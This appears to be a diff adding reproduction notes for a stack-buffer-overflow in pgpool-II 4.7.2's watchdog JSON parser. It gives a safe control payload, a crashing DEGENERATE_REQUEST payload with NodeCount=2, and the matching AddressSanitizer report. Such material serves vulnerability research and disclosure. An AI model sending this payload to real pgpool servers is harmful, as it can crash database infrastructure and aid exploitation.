@@ -1,0 +1,9 @@
+### A: 4.7.2 ASan NodeCount=1 safe control
+payload={"Function":"DEGENERATE_REQUEST","Flags":0,"NodeCount":1,"NodeIdList":[286331153]}
+&node_id_list=0x7e640be00060  next_slot=0x7e640be00068
+### B: 4.7.2 ASan NodeCount=2 wild read
+payload={"Function":"DEGENERATE_REQUEST","Flags":0,"NodeCount":2,"NodeIdList":[1094795585,1111638594]}
+&node_id_list=0x765709600060  next_slot=0x765709600068
+==1258813==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x765709600068 at pc 0x5b87af288217 bp 0x7ffd3c3715b0 sp 0x7ffd3c3715a0
+    #0 0x5b87af288216 in parse_wd_node_function_json /tmp/w108-pgpool/pgpool-II-4.7.2/src/watchdog/wd_json_data.c:858
+SUMMARY: AddressSanitizer: stack-buffer-overflow /tmp/w108-pgpool/pgpool-II-4.7.2/src/watchdog/wd_json_data.c:858 in parse_wd_node_function_json
